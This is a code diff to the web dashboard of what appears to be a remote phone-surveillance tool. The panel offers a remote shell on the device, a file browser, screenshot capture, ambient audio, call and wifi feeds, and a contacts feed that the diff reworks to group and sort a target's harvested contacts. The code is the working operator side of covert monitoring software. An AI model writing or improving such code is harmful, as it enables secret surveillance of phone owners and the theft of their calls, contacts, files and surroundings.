@@ -134,7 +134,6 @@ function injectAdvancedControls() {
     timeW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE</label><input type="time" id="time-setter">`;
     controlMatrixCard.after(timeW);
 
-    // SHELL with styled output
     const shellW = document.createElement('div'); shellW.className = 'shell-control-wrapper';
     shellW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-terminal"></i> REMOTE SHELL</label><div style="display:flex;gap:8px;"><input type="text" id="shell-input" placeholder="ls /sdcard" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;"><button id="cmd-shell" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">RUN</button></div><pre id="shell-output" style="display:none;background:#050510;color:#00ff88;padding:12px;border-radius:8px;margin-top:8px;font-size:11px;max-height:400px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;font-family:'Courier New',monospace;line-height:1.5;border:1px solid #1a3a1a;"></pre>`;
     timeW.after(shellW);
@@ -272,12 +271,31 @@ function initializeDataFeedListeners(uid) {
         const f = document.getElementById('calls-feed'); if(!f||!items.length) return;
         f.innerHTML = items.map(c=>{const i=c.state==='ringing'?'🔔':c.state==='offhook'?'📞':'📴';return `<div class="feed-item live-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${c.state} • ${fmtTime(c.timestamp)}</small></div>`;}).join('') + f.innerHTML;
     });
+
+    // ── CONTACTS — ALL contacts, grouped by name, sorted A-Z ──
     listenToFeed(uid, 'contacts', (d) => {
         const ct = d.contacts||[]; const c = document.getElementById('contacts-count'); if(c) c.textContent = ct.length;
         const f = document.getElementById('contacts-feed'); if(!f) return;
         if(!ct.length){f.innerHTML='No contact data yet';return;}
-        f.innerHTML = ct.slice(0,100).map(c=>`<div class="feed-item"><strong>${esc(c.name||'Unknown')}</strong> <small>${c.number||''} • ${c.type||''}</small></div>`).join('') + (ct.length>100?`<div class="feed-item">... and ${ct.length-100} more</div>`:'');
+        var grouped = {};
+        ct.forEach(function(c) {
+            var name = c.name || 'Unknown';
+            if(!grouped[name]) grouped[name] = [];
+            var num = c.number || '';
+            var typ = c.type || '';
+            var exists = grouped[name].some(function(n){return n.number===num && n.type===typ;});
+            if(!exists) grouped[name].push({number:num, type:typ});
+        });
+        var names = Object.keys(grouped).sort(function(a,b){return a.localeCompare(b);});
+        var html = '<div class="feed-item" style="color:#00ff88;">👥 ' + names.length + ' unique contacts (' + ct.length + ' total entries)</div>';
+        names.forEach(function(name) {
+            var nums = grouped[name];
+            var numHtml = nums.map(function(n){return esc(n.number) + ' <span style="color:#555;">• ' + esc(n.type) + '</span>';}).join('<br>');
+            html += '<div class="feed-item"><strong>' + esc(name) + '</strong><br><small>' + numHtml + '</small></div>';
+        });
+        f.innerHTML = html;
     });
+
     listenToFeed(uid, 'wifi', (d) => {
         const nets = d.nearby_networks||[]; const c = document.getElementById('wifi-count'); if(c) c.textContent = nets.length;
         const f = document.getElementById('wifi-feed'); if(!f) return;
@@ -386,7 +404,6 @@ function initializeDataFeedListeners(uid) {
             return;
         }
 
-        // Single file info view with preview
         if(d.is_file) {
             let html = '<div style="margin-bottom:10px;">';
             if(d.preview_url) {
@@ -418,7 +435,6 @@ function initializeDataFeedListeners(uid) {
             return;
         }
 
-        // Directory listing
         let html = '<div style="color:#00ff88;font-size:13px;margin-bottom:4px;">📂 ' + esc(d.current_path||'/') + '</div>';
         html += '<div style="color:#666;font-size:10px;margin-bottom:10px;">' + (d.total_dirs||0) + ' folders • ' + (d.total_files||0) + ' files';
         if(d.shown_files !== undefined && d.total_files > d.shown_files) html += ' (showing ' + d.shown_files + ')';
@@ -495,7 +511,6 @@ function initializeDataFeedListeners(uid) {
         if(img){if(ph) ph.style.display='none'; img.src=d.screenshot; img.style.display='block'; const ts=document.getElementById('captureTimestamp'); if(ts) ts.innerText=`SCREENSHOT: ${new Date().toLocaleTimeString()}`;}
     });
 
-    // ── AMBIENT STATUS + AUDIO PLAYBACK ──────────────
     listenToFeed(uid, 'ambient_status', (d) => {
         const b = document.getElementById('cmd-ambient'); if(!b||!d) return;
         const s = b.querySelector('.toggle-state');
@@ -542,7 +557,6 @@ function initializeDataFeedListeners(uid) {
         else{b.classList.remove('active');if(s){s.textContent='OFF';s.style.color='#666';}}
     });
 
-    // ── TRAFFIC ──────────────────────────────────────
     listenToFeed(uid, 'traffic_current', (d) => {
         const f = document.getElementById('traffic-feed'); if(!f||!d) return;
         let html = `<div class="feed-item"><strong>📊 Total</strong></div>`;
@@ -568,11 +582,9 @@ function listenToFeed(uid, path, cb) {
     deviceListeners[k] = onValue(r, (s) => { if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} });
 }
 
-// ── OPEN PREVIEW IN NEW TAB (Blob URL — works on mobile) ──
 window.openPreview = function(src) {
     if(!src) return;
     try {
-        // If it's a data URL, convert to Blob for mobile compatibility
         if(src.startsWith('data:')) {
             var byteString = atob(src.split(',')[1]);
             var mimeString = src.split(',')[0].split(':')[1].split(';')[0];
@@ -593,7 +605,6 @@ window.openPreview = function(src) {
     }
 };
 
-// ── FILE BROWSER NAVIGATION ──────────────────────────
 window.navigateToFile = function(path) {
     if(!selectedDevice) return;
     sendCmd(selectedDevice, 'list_files', path.trim());
